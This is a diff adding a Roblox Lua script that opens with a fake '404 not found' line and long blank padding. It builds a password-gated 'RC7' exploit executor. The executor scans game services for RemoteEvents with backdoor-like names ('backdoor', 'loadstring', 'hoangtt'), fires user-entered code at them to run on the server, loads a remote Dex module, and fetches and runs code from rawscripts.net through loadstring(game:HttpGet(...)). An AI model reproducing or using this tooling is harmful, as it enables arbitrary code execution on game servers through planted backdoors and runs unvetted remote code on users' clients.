@@ -1,0 +1,777 @@
+-404 not found
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--[=[
+ d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
+88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
+88      88    88    88            odD'      88      88    88 88ooo88 
+88  ooo 88    88    88          .88'        88      88    88 88~~~88 
+88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
+ Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
+
+designed using localmaze gui creator
+]=]
+
+local LMG2L = {};
+
+LMG2L["ScreenGui_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
+LMG2L["ScreenGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+
+LMG2L["mango_2"] = Instance.new("ImageButton", LMG2L["ScreenGui_1"]);
+LMG2L["mango_2"]["BorderSizePixel"] = 0;
+LMG2L["mango_2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["mango_2"]["Image"] = [[rbxassetid://112060241549428]];
+LMG2L["mango_2"]["Size"] = UDim2.new(0, 336, 0, 362);
+LMG2L["mango_2"]["Name"] = [[mango]];
+LMG2L["mango_2"]["Position"] = UDim2.new(0, 240, 0, -40);
+
+LMG2L["TextBox 1_3"] = Instance.new("TextBox", LMG2L["mango_2"]);
+LMG2L["TextBox 1_3"]["Name"] = [[TextBox 1]];
+LMG2L["TextBox 1_3"]["Size"] = UDim2.new(0, 146, 0, 22);
+LMG2L["TextBox 1_3"]["Position"] = UDim2.new(0, 90, 0, 142);
+LMG2L["TextBox 1_3"]["Text"] = [[]];
+LMG2L["TextBox 1_3"]["BackgroundTransparency"] = 1;
+LMG2L["TextBox 1_3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+
+LMG2L["TextBox 2_4"] = Instance.new("TextBox", LMG2L["mango_2"]);
+LMG2L["TextBox 2_4"]["Name"] = [[TextBox 2]];
+LMG2L["TextBox 2_4"]["Size"] = UDim2.new(0, 154, 0, 22);
+LMG2L["TextBox 2_4"]["Position"] = UDim2.new(0, 86, 0, 172);
+LMG2L["TextBox 2_4"]["Text"] = [[]];
+LMG2L["TextBox 2_4"]["BackgroundTransparency"] = 1;
+LMG2L["TextBox 2_4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+
+LMG2L["submit _6"] = Instance.new("TextButton", LMG2L["mango_2"]);
+LMG2L["submit _6"]["Name"] = [[submit]];
+LMG2L["submit _6"]["BackgroundTransparency"] = 1;
+LMG2L["submit _6"]["Size"] = UDim2.new(0, 102, 0, 22);
+LMG2L["submit _6"]["Position"] = UDim2.new(0, 112, 0, 202);
+LMG2L["submit _6"]["Text"] = [[]];
+
+LMG2L["delete rc7_7"] = Instance.new("TextButton", LMG2L["mango_2"]);
+LMG2L["delete rc7_7"]["Name"] = [[delete rc7]];
+LMG2L["delete rc7_7"]["BackgroundTransparency"] = 1;
+LMG2L["delete rc7_7"]["Size"] = UDim2.new(0, 36, 0, 28);
+LMG2L["delete rc7_7"]["Position"] = UDim2.new(0, 298, 0, 0);
+LMG2L["delete rc7_7"]["Text"] = [[]];
+
+task.spawn(function()
+	local UserInputService = game:GetService("UserInputService")	
+	local gui = LMG2L["mango_2"]
+	local dragging, dragInput, dragStart, startPos	
+	
+	local function update(input)	
+	    local delta = input.Position - dragStart	
+	    gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)	
+	end	
+	
+	gui.InputBegan:Connect(function(input)	
+	    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then	
+	        dragging = true
+	        dragStart = input.Position
+	        startPos = gui.Position
+	        input.Changed:Connect(function()
+	            if input.UserInputState == Enum.UserInputState.End then dragging = false end
+	        end)
+	    end
+	end)
+	
+	gui.InputChanged:Connect(function(input)
+	    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end
+	end)
+	
+	UserInputService.InputChanged:Connect(function(input)
+	    if input == dragInput and dragging then update(input) end
+	end)
+end)
+
+task.spawn(function()
+	local submitBtn = LMG2L["submit _6"]
+	local deleteBtn = LMG2L["delete rc7_7"]
+	local keyBox = LMG2L["TextBox 2_4"]
+	local mainGui = LMG2L["ScreenGui_1"]
+	
+	submitBtn.MouseButton1Click:Connect(function()
+		if keyBox.Text == "hoangtt.03" then
+			mainGui:Destroy()
+			
+		   --[=[
+ d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
+88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
+88      88    88    88            odD'      88      88    88 88ooo88 
+88  ooo 88    88    88          .88'        88      88    88 88~~~88 
+88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
+ Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
+]=]
+
+local LMG2L = {};
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LogService = game:GetService("LogService")
+local UserInputService = game:GetService("UserInputService")
+local CoreGui = game:GetService("CoreGui")
+local Workspace = game:GetService("Workspace")
+local Lighting = game:GetService("Lighting")
+local LocalPlayer = game:GetService("Players").LocalPlayer
+
+local suspiciousRemotes = {}
+
+local suspiciousKeywords = {
+    "exec", "run", "load", "admin", "cmd", "command", "console",
+    "backdoor", "bypass", "inject", "execute", "script", "lua",
+    "server", "remote", "require", "loadstring", "eval", "compile",
+    "hoang", "backdoored", "fe", "hoangtt", "vip", "secret",
+    "MainModule", "Module", "AdminCmd", "Owner", "Console", "Debug"
+}
+
+local function isSuspicious(name)
+    local lowerName = string.lower(tostring(name or ""))
+    for _, keyword in ipairs(suspiciousKeywords) do
+        if string.find(lowerName, keyword, 1, true) then
+            return true
+        end
+    end
+    return false
+end
+
+local function scanRemotes()
+    suspiciousRemotes = {}
+    local containers = {ReplicatedStorage, Workspace, LocalPlayer, CoreGui, Lighting}
+    for _, container in pairs(containers) do
+        for _, v in pairs(container:GetDescendants()) do
+            if v:IsA("RemoteEvent") then
+                if isSuspicious(v.Name) then
+                    table.insert(suspiciousRemotes, v)
+                end
+            end
+        end
+    end
+end
+
+LMG2L["ScreenGui_1"] = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"));
+LMG2L["ScreenGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+
+LMG2L["ImageButton_2"] = Instance.new("ImageButton", LMG2L["ScreenGui_1"]);
+LMG2L["ImageButton_2"]["BorderSizePixel"] = 0;
+LMG2L["ImageButton_2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+LMG2L["ImageButton_2"]["Image"] = [[rbxassetid://111054072162506]];
+LMG2L["ImageButton_2"]["Size"] = UDim2.new(0, 340, 0, 362);
+LMG2L["ImageButton_2"]["Position"] = UDim2.new(0, 334, 0, 50);
+
+local VisualIcon = Instance.new("ImageButton", LMG2L["ScreenGui_1"])
+VisualIcon.Size = UDim2.new(0, 50, 0, 50)
+VisualIcon.Position = UDim2.new(0, 10, 0, 10)
+VisualIcon.Image = "rbxassetid://125113198359675"
+VisualIcon.Visible = false
+VisualIcon.BackgroundTransparency = 1
+
+LMG2L["TextBox b_6"] = Instance.new("TextBox", LMG2L["ImageButton_2"]);
+LMG2L["TextBox b_6"]["Name"] = [[TextBox b]];
+LMG2L["TextBox b_6"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+LMG2L["TextBox b_6"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+LMG2L["TextBox b_6"]["Size"] = UDim2.new(0, 288, 0, 242);
+LMG2L["TextBox b_6"]["Position"] = UDim2.new(0, 12, 0, 36);
+LMG2L["TextBox b_6"]["BackgroundTransparency"] = 1;
+LMG2L["TextBox b_6"]["MultiLine"] = true;
+LMG2L["TextBox b_6"]["Text"] = "";
+LMG2L["TextBox b_6"]["ClearTextOnFocus"] = false;
+
+local function createInvisibleBtn(name, pos, size)
+    local btn = Instance.new("TextButton", LMG2L["ImageButton_2"])
+    btn.Name = name
+    btn.Size = size
+    btn.Position = pos
+    btn.BackgroundTransparency = 1
+    btn.Text = ""
+    return btn
+end
+
+LMG2L["Open_7"] = createInvisibleBtn("Open", UDim2.new(0, 12, 0, 280), UDim2.new(0, 94, 0, 26))
+LMG2L["Execute_5"] = createInvisibleBtn("Execute", UDim2.new(0, 110, 0, 280), UDim2.new(0, 92, 0, 26))
+LMG2L["Clear_a"] = createInvisibleBtn("Clear", UDim2.new(0, 206, 0, 280), UDim2.new(0, 94, 0, 26))
+LMG2L["visual rc7_3"] = createInvisibleBtn("visual rc7", UDim2.new(0, 208, 0, 0), UDim2.new(0, 40, 0, 24))
+LMG2L["delete rc7_8"] = createInvisibleBtn("delete rc7", UDim2.new(0, 302, 0, 0), UDim2.new(0, 38, 0, 24))
+LMG2L["change version _d"] = createInvisibleBtn("change version", UDim2.new(0, 142, 0, 0), UDim2.new(0, 64, 0, 24))
+
+LMG2L["Console_4"] = Instance.new("ScrollingFrame", LMG2L["ImageButton_2"]);
+LMG2L["Console_4"]["Name"] = [[Console]];
+LMG2L["Console_4"]["Size"] = UDim2.new(0, 288, 0, 52);
+LMG2L["Console_4"]["Position"] = UDim2.new(0, 12, 0, 308);
+LMG2L["Console_4"]["BackgroundTransparency"] = 1;
+LMG2L["Console_4"]["CanvasSize"] = UDim2.new(0, 0, 10, 0);
+LMG2L["Console_4"]["ScrollBarThickness"] = 2;
+
+local UIListLayout = Instance.new("UIListLayout", LMG2L["Console_4"])
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+local dragging, dragInput, dragStart, startPos
+LMG2L["ImageButton_2"].InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true; dragStart = input.Position; startPos = LMG2L["ImageButton_2"].Position
+    end
+end)
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        LMG2L["ImageButton_2"].Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end
+end)
+
+local function executeCode(code)
+    if not code or code == "" then return end
+    for _, remote in pairs(suspiciousRemotes) do
+        pcall(function()
+            remote:FireServer("loadstring", code)            
+        end)
+    end
+end
+
+local function addLog(msg, color)
+    local log = Instance.new("TextLabel", LMG2L["Console_4"])
+    log.Size = UDim2.new(1, 0, 0, 12)
+    log.BackgroundTransparency = 1
+    log.TextColor3 = color or Color3.new(1, 1, 1)
+    log.Text = "> " .. tostring(msg)
+    log.TextSize = 8
+    log.Font = Enum.Font.Code
+    log.TextXAlignment = Enum.TextXAlignment.Left
+    LMG2L["Console_4"].CanvasPosition = Vector2.new(0, LMG2L["Console_4"].AbsoluteCanvasSize.Y)
+end
+
+LMG2L["Execute_5"].MouseButton1Click:Connect(function()
+    executeCode(LMG2L["TextBox b_6"].Text)
+end)
+
+LMG2L["Clear_a"].MouseButton1Click:Connect(function()
+    LMG2L["TextBox b_6"].Text = ""
+end)
+
+LMG2L["Open_7"].MouseButton1Click:Connect(function()
+    local dexCode = [[require(15827159924).MauDex("]] .. LocalPlayer.Name .. [[")]]
+    executeCode(dexCode)
+end)
+
+LMG2L["change version _d"].MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Rc7-134907"))()
+end)
+
+LMG2L["visual rc7_3"].MouseButton1Click:Connect(function()
+    LMG2L["ImageButton_2"].Visible = false
+    VisualIcon.Visible = true
+end)
+
+VisualIcon.MouseButton1Click:Connect(function()
+    VisualIcon.Visible = false
+    LMG2L["ImageButton_2"].Visible = true
+end)
+
+LMG2L["delete rc7_8"].MouseButton1Click:Connect(function()
+    LMG2L["ScreenGui_1"]:Destroy()
+end)
+
+LogService.MessageOut:Connect(function(message, messageType)
+    local color = Color3.new(1, 1, 1)
+    if messageType == Enum.MessageType.MessageError then color = Color3.new(1, 0, 0)
+    elseif messageType == Enum.MessageType.MessageWarning then color = Color3.new(1, 1, 0) end
+    addLog(message, color)
+end)
+
+scanRemotes()
+
+return LMG2L["ScreenGui_1"] 
+		
+		else
+			keyBox.Text = ""
+		end
+	end)
+	
+	deleteBtn.MouseButton1Click:Connect(function()
+		mainGui:Destroy()
+	end)
+end)
+
+return LMG2L["ScreenGui_1"]
